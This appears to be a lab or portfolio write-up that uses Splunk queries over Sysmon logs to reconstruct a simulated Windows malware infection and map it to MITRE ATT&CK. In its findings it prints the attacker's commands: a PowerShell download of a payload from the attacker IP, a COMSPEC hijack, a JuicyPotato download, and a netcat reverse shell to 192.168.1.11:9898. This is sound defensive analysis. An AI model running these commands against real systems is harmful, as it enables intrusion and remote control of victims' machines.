# Sysmon Log Analysis Using Splunk

## Investigating a Malware Attack Using Sysmon SIEM Logs

### Project Overview

This project demonstrates how to use Splunk and Sysmon logs to investigate a Windows malware infection. The analysis focuses on identifying attacker activity, malware downloads, process execution, LOLBin abuse, privilege escalation attempts, and reverse shell activity.

Using Sysmon telemetry and Splunk SPL queries, the complete attack lifecycle was reconstructed and mapped to the MITRE ATT&CK framework.

---

## Objectives

* Investigate attacker activity through Sysmon logs
* Identify the initial access vector
* Detect malware execution
* Track malicious downloads
* Detect LOLBin abuse
* Investigate privilege escalation attempts
* Build an attack timeline
* Map findings to MITRE ATT&CK techniques

---

## Skills Demonstrated

* Sysmon Log Analysis
* Threat Hunting
* Splunk SPL Queries
* Incident Investigation
* IOC Identification
* Attack Timeline Reconstruction
* MITRE ATT&CK Mapping

---

## Tools Used

| Tool              | Purpose                  |
| ----------------- | ------------------------ |
| Splunk Enterprise | Log Analysis             |
| Sysmon            | Endpoint Monitoring      |
| Windows Endpoint  | Attack Simulation        |
| MITRE ATT&CK      | Technique Classification |

---

## Lab Setup

### Splunk Configuration

| Setting    | Value       |
| ---------- | ----------- |
| Index      | sysmon_logs |
| Sourcetype | sysmon_json |

### Dataset

* Sysmon JSON Logs

---

# Investigation Workflow

## 1. Log Validation

Validated Sysmon events after ingestion.

### SPL Query

```spl
index=sysmon_logs
| stats count by Event.System.EventID
```

**Screenshot**

![Event Validation](screenshots/event_validation.png)

---

## 2. PowerShell Activity Investigation

Identified suspicious PowerShell commands used for malware download.

### SPL Query

```spl
index=sysmon_logs
| spath
| search "powershell"
```

### Finding

```powershell
Invoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe
```

**Screenshot**

![PowerShell Activity](screenshots/powershell_download.png)

---

## 3. Initial Access Identification

Searched for the earliest occurrence of the attacker IP.

### SPL Query

```spl
index=sysmon_logs
| spath
| search "192.168.1.11"
| sort _time
```

### Finding

```text
http://192.168.1.11:6969/updater.hta
```

### Initial Access File

```text
updater.hta
```

**Screenshot**

![Initial Access](screenshots/updater_hta.png)

---

## 4. Process Execution Chain

Reconstructed the malware execution sequence.

### Process Tree

```text
chrome.exe
 └── updater.hta
      └── mshta.exe
           └── cmd.exe
                └── powershell.exe
```

**Screenshot**

![Process Chain](screenshots/process_chain.png)

---

## 5. Environment Variable Manipulation

Identified COMSPEC modification used to execute malware.

### Finding

```cmd
set comspec=C:\Windows\temp\supply.exe
```

**Screenshot**

![COMSPEC](screenshots/comspec_modification.png)

---

## 6. LOLBin Abuse

Detected abuse of a legitimate Windows utility.

### LOLBin Identified

```text
ftp.exe
```

**Screenshot**

![LOLBin Abuse](screenshots/ftp_lolbin.png)

---

## 7. Malware Behavior Analysis

Observed host reconnaissance commands executed by the malware.

### First Command Executed

```cmd
ipconfig
```

**Screenshot**

![Reconnaissance](screenshots/ipconfig_execution.png)

---

## 8. Malware Language Identification

DLL load analysis revealed:

```text
python27.dll
```

This suggests the malware was likely written in Python and packaged as a Windows executable.

**Screenshot**

![Python DLL](screenshots/python27_dll.png)

---

## 9. Privilege Escalation Tool Download

### Downloaded Tool

```text
JuicyPotato.exe
```

### Source

```text
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

**Screenshot**

![Juicy Potato](screenshots/juicypotato_download.png)

---

## 10. Reverse Shell Activity

### Observed Command

```cmd
juicy.exe -l 9999 -p nc.exe -a "192.168.1.11 9898 -e cmd.exe"
```

### Reverse Shell Indicators

| Indicator   | Value        |
| ----------- | ------------ |
| Attacker IP | 192.168.1.11 |
| Port        | 9898         |
| Tool        | Netcat       |
| Shell       | cmd.exe      |

**Screenshot**

![Reverse Shell](screenshots/reverse_shell.png)

---

# Key Findings

| Category             | Finding         |
| -------------------- | --------------- |
| Initial Access       | updater.hta     |
| Malware Payload      | supply.exe      |
| LOLBin Abuse         | mshta.exe       |
| LOLBin Abuse         | ftp.exe         |
| Privilege Escalation | JuicyPotato.exe |
| Reverse Shell        | Netcat          |
| Attacker IP          | 192.168.1.11    |

---

# Attack Timeline

| Step | Activity                       |
| ---- | ------------------------------ |
| 1    | updater.hta downloaded         |
| 2    | mshta.exe executed             |
| 3    | PowerShell launched            |
| 4    | supply.exe downloaded          |
| 5    | COMSPEC modified               |
| 6    | ftp.exe abused                 |
| 7    | supply.exe executed            |
| 8    | ipconfig reconnaissance        |
| 9    | python27.dll loaded            |
| 10   | JuicyPotato downloaded         |
| 11   | Privilege escalation attempted |
| 12   | Reverse shell established      |

---

# MITRE ATT&CK Mapping

| Technique                             | ATT&CK ID |
| ------------------------------------- | --------- |
| User Execution                        | T1204     |
| PowerShell                            | T1059.001 |
| Command Shell                         | T1059.003 |
| Mshta                                 | T1218.005 |
| Ingress Tool Transfer                 | T1105     |
| Exploitation for Privilege Escalation | T1068     |
| Application Layer Protocol            | T1071     |
| System Information Discovery          | T1082     |

---

# Indicators of Compromise (IOCs)

| Type       | Value           |
| ---------- | --------------- |
| IP Address | 192.168.1.11    |
| Port       | 6969            |
| Port       | 9898            |
| File       | updater.hta     |
| File       | supply.exe      |
| File       | JuicyPotato.exe |
| LOLBin     | mshta.exe       |
| LOLBin     | ftp.exe         |

---

# Conclusion

This investigation demonstrated how Sysmon telemetry combined with Splunk can reveal the complete lifecycle of a cyber attack. Through systematic threat hunting and timeline reconstruction, the attack was traced from initial HTA execution through malware deployment, privilege escalation, and reverse shell establishment. The findings were mapped to MITRE ATT&CK techniques to better understand attacker behavior and improve detection capabilities.
